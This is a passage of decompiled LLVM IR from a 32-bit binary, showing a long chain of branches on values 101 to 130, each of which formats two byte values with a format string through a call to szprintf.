  store i32 %v1_804b439, i32* @edx, align 4
  %v0_804b443 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b443 = zext i8 %v0_804b443 to i32
  %v2_804b452 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b452, i32* @ebx, align 4
  %v4_804b464 = call i32 @szprintf(i32 %v2_804b452, i32 ptrtoint ([13 x i8]* @global_var_8058e0e.138 to i32), i32 %v1_804b443)
  br label %dec_label_pc_804b469

dec_label_pc_804b469:                             ; preds = %dec_label_pc_804b433, %dec_label_pc_804b439
  %v13_804b469 = icmp eq i32 %v2_8049efa, 101
  %v1_804b46d = icmp eq i1 %v13_804b469, false
  br i1 %v1_804b46d, label %dec_label_pc_804b49f, label %dec_label_pc_804b46f

dec_label_pc_804b46f:                             ; preds = %dec_label_pc_804b469
  %v0_804b46f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b46f = zext i8 %v0_804b46f to i32
  store i32 %v1_804b46f, i32* @edx, align 4
  %v0_804b479 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b479 = zext i8 %v0_804b479 to i32
  %v2_804b488 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b488, i32* @ebx, align 4
  %v4_804b49a = call i32 @szprintf(i32 %v2_804b488, i32 ptrtoint ([13 x i8]* @global_var_8058e1b.139 to i32), i32 %v1_804b479)
  br label %dec_label_pc_804b49f

dec_label_pc_804b49f:                             ; preds = %dec_label_pc_804b469, %dec_label_pc_804b46f
  %v13_804b49f = icmp eq i32 %v2_8049efa, 102
  %v1_804b4a3 = icmp eq i1 %v13_804b49f, false
  br i1 %v1_804b4a3, label %dec_label_pc_804b4d5, label %dec_label_pc_804b4a5

dec_label_pc_804b4a5:                             ; preds = %dec_label_pc_804b49f
  %v0_804b4a5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b4a5 = zext i8 %v0_804b4a5 to i32
  store i32 %v1_804b4a5, i32* @edx, align 4
  %v0_804b4af = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b4af = zext i8 %v0_804b4af to i32
  %v2_804b4be = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4be, i32* @ebx, align 4
  %v4_804b4d0 = call i32 @szprintf(i32 %v2_804b4be, i32 ptrtoint ([12 x i8]* @global_var_8058e28.140 to i32), i32 %v1_804b4af)
  br label %dec_label_pc_804b4d5

dec_label_pc_804b4d5:                             ; preds = %dec_label_pc_804b49f, %dec_label_pc_804b4a5
  %v13_804b4d5 = icmp eq i32 %v2_8049efa, 103
  %v1_804b4d9 = icmp eq i1 %v13_804b4d5, false
  br i1 %v1_804b4d9, label %dec_label_pc_804b50b, label %dec_label_pc_804b4db

dec_label_pc_804b4db:                             ; preds = %dec_label_pc_804b4d5
  %v0_804b4db = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b4db = zext i8 %v0_804b4db to i32
  store i32 %v1_804b4db, i32* @edx, align 4
  %v0_804b4e5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b4e5 = zext i8 %v0_804b4e5 to i32
  %v2_804b4f4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4f4, i32* @ebx, align 4
  %v4_804b506 = call i32 @szprintf(i32 %v2_804b4f4, i32 ptrtoint ([13 x i8]* @global_var_8058e34.141 to i32), i32 %v1_804b4e5)
  br label %dec_label_pc_804b50b

dec_label_pc_804b50b:                             ; preds = %dec_label_pc_804b4d5, %dec_label_pc_804b4db
  %v13_804b50b = icmp eq i32 %v2_8049efa, 104
  %v1_804b50f = icmp eq i1 %v13_804b50b, false
  br i1 %v1_804b50f, label %dec_label_pc_804b541, label %dec_label_pc_804b511

dec_label_pc_804b511:                             ; preds = %dec_label_pc_804b50b
  %v0_804b511 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b511 = zext i8 %v0_804b511 to i32
  store i32 %v1_804b511, i32* @edx, align 4
  %v0_804b51b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b51b = zext i8 %v0_804b51b to i32
  %v2_804b52a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b52a, i32* @ebx, align 4
  %v4_804b53c = call i32 @szprintf(i32 %v2_804b52a, i32 ptrtoint ([13 x i8]* @global_var_8058e41.142 to i32), i32 %v1_804b51b)
  br label %dec_label_pc_804b541

dec_label_pc_804b541:                             ; preds = %dec_label_pc_804b50b, %dec_label_pc_804b511
  %v13_804b541 = icmp eq i32 %v2_8049efa, 105
  %v1_804b545 = icmp eq i1 %v13_804b541, false
  br i1 %v1_804b545, label %dec_label_pc_804b577, label %dec_label_pc_804b547

dec_label_pc_804b547:                             ; preds = %dec_label_pc_804b541
  %v0_804b547 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b547 = zext i8 %v0_804b547 to i32
  store i32 %v1_804b547, i32* @edx, align 4
  %v0_804b551 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b551 = zext i8 %v0_804b551 to i32
  %v2_804b560 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b560, i32* @ebx, align 4
  %v4_804b572 = call i32 @szprintf(i32 %v2_804b560, i32 ptrtoint ([13 x i8]* @global_var_8058e4e.143 to i32), i32 %v1_804b551)
  br label %dec_label_pc_804b577

dec_label_pc_804b577:                             ; preds = %dec_label_pc_804b541, %dec_label_pc_804b547
  %v13_804b577 = icmp eq i32 %v2_8049efa, 106
  %v1_804b57b = icmp eq i1 %v13_804b577, false
  br i1 %v1_804b57b, label %dec_label_pc_804b5ad, label %dec_label_pc_804b57d

dec_label_pc_804b57d:                             ; preds = %dec_label_pc_804b577
  %v0_804b57d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b57d = zext i8 %v0_804b57d to i32
  store i32 %v1_804b57d, i32* @edx, align 4
  %v0_804b587 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b587 = zext i8 %v0_804b587 to i32
  %v2_804b596 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b596, i32* @ebx, align 4
  %v4_804b5a8 = call i32 @szprintf(i32 %v2_804b596, i32 ptrtoint ([12 x i8]* @global_var_8058e5b.144 to i32), i32 %v1_804b587)
  br label %dec_label_pc_804b5ad

dec_label_pc_804b5ad:                             ; preds = %dec_label_pc_804b577, %dec_label_pc_804b57d
  %v13_804b5ad = icmp eq i32 %v2_8049efa, 107
  %v1_804b5b1 = icmp eq i1 %v13_804b5ad, false
  br i1 %v1_804b5b1, label %dec_label_pc_804b5e3, label %dec_label_pc_804b5b3

dec_label_pc_804b5b3:                             ; preds = %dec_label_pc_804b5ad
  %v0_804b5b3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b5b3 = zext i8 %v0_804b5b3 to i32
  store i32 %v1_804b5b3, i32* @edx, align 4
  %v0_804b5bd = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b5bd = zext i8 %v0_804b5bd to i32
  %v2_804b5cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5cc, i32* @ebx, align 4
  %v4_804b5de = call i32 @szprintf(i32 %v2_804b5cc, i32 ptrtoint ([13 x i8]* @global_var_8058e67.145 to i32), i32 %v1_804b5bd)
  br label %dec_label_pc_804b5e3

dec_label_pc_804b5e3:                             ; preds = %dec_label_pc_804b5ad, %dec_label_pc_804b5b3
  %v13_804b5e3 = icmp eq i32 %v2_8049efa, 108
  %v1_804b5e7 = icmp eq i1 %v13_804b5e3, false
  br i1 %v1_804b5e7, label %dec_label_pc_804b619, label %dec_label_pc_804b5e9

dec_label_pc_804b5e9:                             ; preds = %dec_label_pc_804b5e3
  %v0_804b5e9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b5e9 = zext i8 %v0_804b5e9 to i32
  store i32 %v1_804b5e9, i32* @edx, align 4
  %v0_804b5f3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b5f3 = zext i8 %v0_804b5f3 to i32
  %v2_804b602 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b602, i32* @ebx, align 4
  %v4_804b614 = call i32 @szprintf(i32 %v2_804b602, i32 ptrtoint ([14 x i8]* @global_var_8058e74.146 to i32), i32 %v1_804b5f3)
  br label %dec_label_pc_804b619

dec_label_pc_804b619:                             ; preds = %dec_label_pc_804b5e3, %dec_label_pc_804b5e9
  %v13_804b619 = icmp eq i32 %v2_8049efa, 109
  %v1_804b61d = icmp eq i1 %v13_804b619, false
  br i1 %v1_804b61d, label %dec_label_pc_804b64f, label %dec_label_pc_804b61f

dec_label_pc_804b61f:                             ; preds = %dec_label_pc_804b619
  %v0_804b61f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b61f = zext i8 %v0_804b61f to i32
  store i32 %v1_804b61f, i32* @edx, align 4
  %v0_804b629 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b629 = zext i8 %v0_804b629 to i32
  %v2_804b638 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b638, i32* @ebx, align 4
  %v4_804b64a = call i32 @szprintf(i32 %v2_804b638, i32 ptrtoint ([14 x i8]* @global_var_8058e82.147 to i32), i32 %v1_804b629)
  br label %dec_label_pc_804b64f

dec_label_pc_804b64f:                             ; preds = %dec_label_pc_804b619, %dec_label_pc_804b61f
  %v13_804b64f = icmp eq i32 %v2_8049efa, 110
  %v1_804b653 = icmp eq i1 %v13_804b64f, false
  br i1 %v1_804b653, label %dec_label_pc_804b685, label %dec_label_pc_804b655

dec_label_pc_804b655:                             ; preds = %dec_label_pc_804b64f
  %v0_804b655 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b655 = zext i8 %v0_804b655 to i32
  store i32 %v1_804b655, i32* @edx, align 4
  %v0_804b65f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b65f = zext i8 %v0_804b65f to i32
  %v2_804b66e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b66e, i32* @ebx, align 4
  %v4_804b680 = call i32 @szprintf(i32 %v2_804b66e, i32 ptrtoint ([13 x i8]* @global_var_8058e90.148 to i32), i32 %v1_804b65f)
  br label %dec_label_pc_804b685

dec_label_pc_804b685:                             ; preds = %dec_label_pc_804b64f, %dec_label_pc_804b655
  %v13_804b685 = icmp eq i32 %v2_8049efa, 111
  %v1_804b689 = icmp eq i1 %v13_804b685, false
  br i1 %v1_804b689, label %dec_label_pc_804b6bb, label %dec_label_pc_804b68b

dec_label_pc_804b68b:                             ; preds = %dec_label_pc_804b685
  %v0_804b68b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b68b = zext i8 %v0_804b68b to i32
  store i32 %v1_804b68b, i32* @edx, align 4
  %v0_804b695 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b695 = zext i8 %v0_804b695 to i32
  %v2_804b6a4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6a4, i32* @ebx, align 4
  %v4_804b6b6 = call i32 @szprintf(i32 %v2_804b6a4, i32 ptrtoint ([14 x i8]* @global_var_8058e9d.149 to i32), i32 %v1_804b695)
  br label %dec_label_pc_804b6bb

dec_label_pc_804b6bb:                             ; preds = %dec_label_pc_804b685, %dec_label_pc_804b68b
  %v10_804b6bb = icmp eq i32 %v2_8049efa, 112
  %v1_804b6bf = icmp eq i1 %v10_804b6bb, false
  br i1 %v1_804b6bf, label %dec_label_pc_804b6f1, label %dec_label_pc_804b6c1

dec_label_pc_804b6c1:                             ; preds = %dec_label_pc_804b6bb
  %v0_804b6c1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b6c1 = zext i8 %v0_804b6c1 to i32
  store i32 %v1_804b6c1, i32* @edx, align 4
  %v0_804b6cb = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b6cb = zext i8 %v0_804b6cb to i32
  %v2_804b6da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6da, i32* @ebx, align 4
  %v4_804b6ec = call i32 @szprintf(i32 %v2_804b6da, i32 ptrtoint ([14 x i8]* @global_var_8058eab.150 to i32), i32 %v1_804b6cb)
  br label %dec_label_pc_804b6f1

dec_label_pc_804b6f1:                             ; preds = %dec_label_pc_804b6bb, %dec_label_pc_804b6c1
  %v13_804b6f1 = icmp eq i32 %v2_8049efa, 113
  %v1_804b6f5 = icmp eq i1 %v13_804b6f1, false
  br i1 %v1_804b6f5, label %dec_label_pc_804b727, label %dec_label_pc_804b6f7

dec_label_pc_804b6f7:                             ; preds = %dec_label_pc_804b6f1
  %v0_804b6f7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b6f7 = zext i8 %v0_804b6f7 to i32
  store i32 %v1_804b6f7, i32* @edx, align 4
  %v0_804b701 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b701 = zext i8 %v0_804b701 to i32
  %v2_804b710 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b710, i32* @ebx, align 4
  %v4_804b722 = call i32 @szprintf(i32 %v2_804b710, i32 ptrtoint ([13 x i8]* @global_var_8058eb9.151 to i32), i32 %v1_804b701)
  br label %dec_label_pc_804b727

dec_label_pc_804b727:                             ; preds = %dec_label_pc_804b6f1, %dec_label_pc_804b6f7
  %v13_804b727 = icmp eq i32 %v2_8049efa, 114
  %v1_804b72b = icmp eq i1 %v13_804b727, false
  br i1 %v1_804b72b, label %dec_label_pc_804b75d, label %dec_label_pc_804b72d

dec_label_pc_804b72d:                             ; preds = %dec_label_pc_804b727
  %v0_804b72d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b72d = zext i8 %v0_804b72d to i32
  store i32 %v1_804b72d, i32* @edx, align 4
  %v0_804b737 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b737 = zext i8 %v0_804b737 to i32
  %v2_804b746 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b746, i32* @ebx, align 4
  %v4_804b758 = call i32 @szprintf(i32 %v2_804b746, i32 ptrtoint ([14 x i8]* @global_var_8058ec6.152 to i32), i32 %v1_804b737)
  br label %dec_label_pc_804b75d

dec_label_pc_804b75d:                             ; preds = %dec_label_pc_804b727, %dec_label_pc_804b72d
  %v13_804b75d = icmp eq i32 %v2_8049efa, 115
  %v1_804b761 = icmp eq i1 %v13_804b75d, false
  br i1 %v1_804b761, label %dec_label_pc_804b793, label %dec_label_pc_804b763

dec_label_pc_804b763:                             ; preds = %dec_label_pc_804b75d
  %v0_804b763 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b763 = zext i8 %v0_804b763 to i32
  store i32 %v1_804b763, i32* @edx, align 4
  %v0_804b76d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b76d = zext i8 %v0_804b76d to i32
  %v2_804b77c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b77c, i32* @ebx, align 4
  %v4_804b78e = call i32 @szprintf(i32 %v2_804b77c, i32 ptrtoint ([13 x i8]* @global_var_8058ed4.153 to i32), i32 %v1_804b76d)
  br label %dec_label_pc_804b793

dec_label_pc_804b793:                             ; preds = %dec_label_pc_804b75d, %dec_label_pc_804b763
  %v13_804b793 = icmp eq i32 %v2_8049efa, 116
  %v1_804b797 = icmp eq i1 %v13_804b793, false
  br i1 %v1_804b797, label %dec_label_pc_804b7c9, label %dec_label_pc_804b799

dec_label_pc_804b799:                             ; preds = %dec_label_pc_804b793
  %v0_804b799 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b799 = zext i8 %v0_804b799 to i32
  store i32 %v1_804b799, i32* @edx, align 4
  %v0_804b7a3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b7a3 = zext i8 %v0_804b7a3 to i32
  %v2_804b7b2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7b2, i32* @ebx, align 4
  %v4_804b7c4 = call i32 @szprintf(i32 %v2_804b7b2, i32 ptrtoint ([13 x i8]* @global_var_8058ee1.154 to i32), i32 %v1_804b7a3)
  br label %dec_label_pc_804b7c9

dec_label_pc_804b7c9:                             ; preds = %dec_label_pc_804b793, %dec_label_pc_804b799
  %v13_804b7c9 = icmp eq i32 %v2_8049efa, 117
  %v1_804b7cd = icmp eq i1 %v13_804b7c9, false
  br i1 %v1_804b7cd, label %dec_label_pc_804b7ff, label %dec_label_pc_804b7cf

dec_label_pc_804b7cf:                             ; preds = %dec_label_pc_804b7c9
  %v0_804b7cf = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b7cf = zext i8 %v0_804b7cf to i32
  store i32 %v1_804b7cf, i32* @edx, align 4
  %v0_804b7d9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b7d9 = zext i8 %v0_804b7d9 to i32
  %v2_804b7e8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7e8, i32* @ebx, align 4
  %v4_804b7fa = call i32 @szprintf(i32 %v2_804b7e8, i32 ptrtoint ([14 x i8]* @global_var_8058eee.155 to i32), i32 %v1_804b7d9)
  br label %dec_label_pc_804b7ff

dec_label_pc_804b7ff:                             ; preds = %dec_label_pc_804b7c9, %dec_label_pc_804b7cf
  %v13_804b7ff = icmp eq i32 %v2_8049efa, 118
  %v1_804b803 = icmp eq i1 %v13_804b7ff, false
  br i1 %v1_804b803, label %dec_label_pc_804b835, label %dec_label_pc_804b805

dec_label_pc_804b805:                             ; preds = %dec_label_pc_804b7ff
  %v0_804b805 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b805 = zext i8 %v0_804b805 to i32
  store i32 %v1_804b805, i32* @edx, align 4
  %v0_804b80f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b80f = zext i8 %v0_804b80f to i32
  %v2_804b81e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b81e, i32* @ebx, align 4
  %v4_804b830 = call i32 @szprintf(i32 %v2_804b81e, i32 ptrtoint ([14 x i8]* @global_var_8058efc.156 to i32), i32 %v1_804b80f)
  br label %dec_label_pc_804b835

dec_label_pc_804b835:                             ; preds = %dec_label_pc_804b7ff, %dec_label_pc_804b805
  %v13_804b835 = icmp eq i32 %v2_8049efa, 119
  %v1_804b839 = icmp eq i1 %v13_804b835, false
  br i1 %v1_804b839, label %dec_label_pc_804b86b, label %dec_label_pc_804b83b

dec_label_pc_804b83b:                             ; preds = %dec_label_pc_804b835
  %v0_804b83b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b83b = zext i8 %v0_804b83b to i32
  store i32 %v1_804b83b, i32* @edx, align 4
  %v0_804b845 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b845 = zext i8 %v0_804b845 to i32
  %v2_804b854 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b854, i32* @ebx, align 4
  %v4_804b866 = call i32 @szprintf(i32 %v2_804b854, i32 ptrtoint ([14 x i8]* @global_var_8058f0a.157 to i32), i32 %v1_804b845)
  br label %dec_label_pc_804b86b

dec_label_pc_804b86b:                             ; preds = %dec_label_pc_804b835, %dec_label_pc_804b83b
  %v13_804b86b = icmp eq i32 %v2_8049efa, 120
  %v1_804b86f = icmp eq i1 %v13_804b86b, false
  br i1 %v1_804b86f, label %dec_label_pc_804b8a1, label %dec_label_pc_804b871

dec_label_pc_804b871:                             ; preds = %dec_label_pc_804b86b
  %v0_804b871 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b871 = zext i8 %v0_804b871 to i32
  store i32 %v1_804b871, i32* @edx, align 4
  %v0_804b87b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b87b = zext i8 %v0_804b87b to i32
  %v2_804b88a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b88a, i32* @ebx, align 4
  %v4_804b89c = call i32 @szprintf(i32 %v2_804b88a, i32 ptrtoint ([14 x i8]* @global_var_8058f18.158 to i32), i32 %v1_804b87b)
  br label %dec_label_pc_804b8a1

dec_label_pc_804b8a1:                             ; preds = %dec_label_pc_804b86b, %dec_label_pc_804b871
  %v13_804b8a1 = icmp eq i32 %v2_8049efa, 121
  %v1_804b8a5 = icmp eq i1 %v13_804b8a1, false
  br i1 %v1_804b8a5, label %dec_label_pc_804b8d7, label %dec_label_pc_804b8a7

dec_label_pc_804b8a7:                             ; preds = %dec_label_pc_804b8a1
  %v0_804b8a7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b8a7 = zext i8 %v0_804b8a7 to i32
  store i32 %v1_804b8a7, i32* @edx, align 4
  %v0_804b8b1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b8b1 = zext i8 %v0_804b8b1 to i32
  %v2_804b8c0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8c0, i32* @ebx, align 4
  %v4_804b8d2 = call i32 @szprintf(i32 %v2_804b8c0, i32 ptrtoint ([14 x i8]* @global_var_8058e74.146 to i32), i32 %v1_804b8b1)
  br label %dec_label_pc_804b8d7

dec_label_pc_804b8d7:                             ; preds = %dec_label_pc_804b8a1, %dec_label_pc_804b8a7
  %v13_804b8d7 = icmp eq i32 %v2_8049efa, 122
  %v1_804b8db = icmp eq i1 %v13_804b8d7, false
  br i1 %v1_804b8db, label %dec_label_pc_804b90d, label %dec_label_pc_804b8dd

dec_label_pc_804b8dd:                             ; preds = %dec_label_pc_804b8d7
  %v0_804b8dd = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b8dd = zext i8 %v0_804b8dd to i32
  store i32 %v1_804b8dd, i32* @edx, align 4
  %v0_804b8e7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b8e7 = zext i8 %v0_804b8e7 to i32
  %v2_804b8f6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8f6, i32* @ebx, align 4
  %v4_804b908 = call i32 @szprintf(i32 %v2_804b8f6, i32 ptrtoint ([13 x i8]* @global_var_8058f26.159 to i32), i32 %v1_804b8e7)
  br label %dec_label_pc_804b90d

dec_label_pc_804b90d:                             ; preds = %dec_label_pc_804b8d7, %dec_label_pc_804b8dd
  %v13_804b90d = icmp eq i32 %v2_8049efa, 123
  %v1_804b911 = icmp eq i1 %v13_804b90d, false
  br i1 %v1_804b911, label %dec_label_pc_804b943, label %dec_label_pc_804b913

dec_label_pc_804b913:                             ; preds = %dec_label_pc_804b90d
  %v0_804b913 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b913 = zext i8 %v0_804b913 to i32
  store i32 %v1_804b913, i32* @edx, align 4
  %v0_804b91d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b91d = zext i8 %v0_804b91d to i32
  %v2_804b92c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b92c, i32* @ebx, align 4
  %v4_804b93e = call i32 @szprintf(i32 %v2_804b92c, i32 ptrtoint ([12 x i8]* @global_var_8058f33.160 to i32), i32 %v1_804b91d)
  br label %dec_label_pc_804b943

dec_label_pc_804b943:                             ; preds = %dec_label_pc_804b90d, %dec_label_pc_804b913
  %v13_804b943 = icmp eq i32 %v2_8049efa, 124
  %v1_804b947 = icmp eq i1 %v13_804b943, false
  br i1 %v1_804b947, label %dec_label_pc_804b979, label %dec_label_pc_804b949

dec_label_pc_804b949:                             ; preds = %dec_label_pc_804b943
  %v0_804b949 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b949 = zext i8 %v0_804b949 to i32
  store i32 %v1_804b949, i32* @edx, align 4
  %v0_804b953 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b953 = zext i8 %v0_804b953 to i32
  %v2_804b962 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b962, i32* @ebx, align 4
  %v4_804b974 = call i32 @szprintf(i32 %v2_804b962, i32 ptrtoint ([14 x i8]* @global_var_8058f3f.161 to i32), i32 %v1_804b953)
  br label %dec_label_pc_804b979

dec_label_pc_804b979:                             ; preds = %dec_label_pc_804b943, %dec_label_pc_804b949
  %v13_804b979 = icmp eq i32 %v2_8049efa, 125
  %v1_804b97d = icmp eq i1 %v13_804b979, false
  br i1 %v1_804b97d, label %dec_label_pc_804b9af, label %dec_label_pc_804b97f

dec_label_pc_804b97f:                             ; preds = %dec_label_pc_804b979
  %v0_804b97f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b97f = zext i8 %v0_804b97f to i32
  store i32 %v1_804b97f, i32* @edx, align 4
  %v0_804b989 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b989 = zext i8 %v0_804b989 to i32
  %v2_804b998 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b998, i32* @ebx, align 4
  %v4_804b9aa = call i32 @szprintf(i32 %v2_804b998, i32 ptrtoint ([14 x i8]* @global_var_8058f4d.162 to i32), i32 %v1_804b989)
  br label %dec_label_pc_804b9af

dec_label_pc_804b9af:                             ; preds = %dec_label_pc_804b979, %dec_label_pc_804b97f
  %v13_804b9af = icmp eq i32 %v2_8049efa, 126
  %v1_804b9b3 = icmp eq i1 %v13_804b9af, false
  br i1 %v1_804b9b3, label %dec_label_pc_804b9e5, label %dec_label_pc_804b9b5

dec_label_pc_804b9b5:                             ; preds = %dec_label_pc_804b9af
  %v0_804b9b5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b9b5 = zext i8 %v0_804b9b5 to i32
  store i32 %v1_804b9b5, i32* @edx, align 4
  %v0_804b9bf = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b9bf = zext i8 %v0_804b9bf to i32
  %v2_804b9ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9ce, i32* @ebx, align 4
  %v4_804b9e0 = call i32 @szprintf(i32 %v2_804b9ce, i32 ptrtoint ([14 x i8]* @global_var_8058f3f.161 to i32), i32 %v1_804b9bf)
  br label %dec_label_pc_804b9e5

dec_label_pc_804b9e5:                             ; preds = %dec_label_pc_804b9af, %dec_label_pc_804b9b5
  %v13_804b9e5 = icmp eq i32 %v2_8049efa, 127
  %v1_804b9e9 = icmp eq i1 %v13_804b9e5, false
  br i1 %v1_804b9e9, label %dec_label_pc_804ba1b, label %dec_label_pc_804b9eb

dec_label_pc_804b9eb:                             ; preds = %dec_label_pc_804b9e5
  %v0_804b9eb = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804b9eb = zext i8 %v0_804b9eb to i32
  store i32 %v1_804b9eb, i32* @edx, align 4
  %v0_804b9f5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804b9f5 = zext i8 %v0_804b9f5 to i32
  %v2_804ba04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba04, i32* @ebx, align 4
  %v4_804ba16 = call i32 @szprintf(i32 %v2_804ba04, i32 ptrtoint ([14 x i8]* @global_var_8058f5b.163 to i32), i32 %v1_804b9f5)
  br label %dec_label_pc_804ba1b

dec_label_pc_804ba1b:                             ; preds = %dec_label_pc_804b9e5, %dec_label_pc_804b9eb
  %v10_804ba1b = icmp eq i32 %v2_8049efa, 128
  %v1_804ba22 = icmp eq i1 %v10_804ba1b, false
  br i1 %v1_804ba22, label %dec_label_pc_804ba54, label %dec_label_pc_804ba24

dec_label_pc_804ba24:                             ; preds = %dec_label_pc_804ba1b
  %v0_804ba24 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ba24 = zext i8 %v0_804ba24 to i32
  store i32 %v1_804ba24, i32* @edx, align 4
  %v0_804ba2e = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ba2e = zext i8 %v0_804ba2e to i32
  %v2_804ba3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba3d, i32* @ebx, align 4
  %v4_804ba4f = call i32 @szprintf(i32 %v2_804ba3d, i32 ptrtoint ([14 x i8]* @global_var_8058f69.164 to i32), i32 %v1_804ba2e)
  br label %dec_label_pc_804ba54

dec_label_pc_804ba54:                             ; preds = %dec_label_pc_804ba1b, %dec_label_pc_804ba24
  %v13_804ba54 = icmp eq i32 %v2_8049efa, 129
  %v1_804ba5b = icmp eq i1 %v13_804ba54, false
  br i1 %v1_804ba5b, label %dec_label_pc_804ba8d, label %dec_label_pc_804ba5d

dec_label_pc_804ba5d:                             ; preds = %dec_label_pc_804ba54
  %v0_804ba5d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ba5d = zext i8 %v0_804ba5d to i32
  store i32 %v1_804ba5d, i32* @edx, align 4
  %v0_804ba67 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804ba67 = zext i8 %v0_804ba67 to i32
  %v2_804ba76 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba76, i32* @ebx, align 4
  %v4_804ba88 = call i32 @szprintf(i32 %v2_804ba76, i32 ptrtoint ([14 x i8]* @global_var_8058f77.165 to i32), i32 %v1_804ba67)
  br label %dec_label_pc_804ba8d

dec_label_pc_804ba8d:                             ; preds = %dec_label_pc_804ba54, %dec_label_pc_804ba5d
  %v13_804ba8d = icmp eq i32 %v2_8049efa, 130
  %v1_804ba94 = icmp eq i1 %v13_804ba8d, false
  br i1 %v1_804ba94, label %dec_label_pc_804bac6, label %dec_label_pc_804ba96

dec_label_pc_804ba96:                             ; preds = %dec_label_pc_804ba8d
  %v0_804ba96 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804ba96 = zext i8 %v0_804ba96 to i32
  store i32 %v1_804ba96, i32* @edx, align 4
  %v0_804baa0 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804baa0 = zext i8 %v0_804baa0 to i32
  %v2_804baaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baaf, i32* @ebx, align 4
  %v4_804bac1 = call i32 @szprintf(i32 %v2_804baaf, i32 ptrtoint ([14 x i8]* @global_var_8058f85.166 to i32), i32 %v1_804baa0)
  br label %dec_label_pc_804bac6

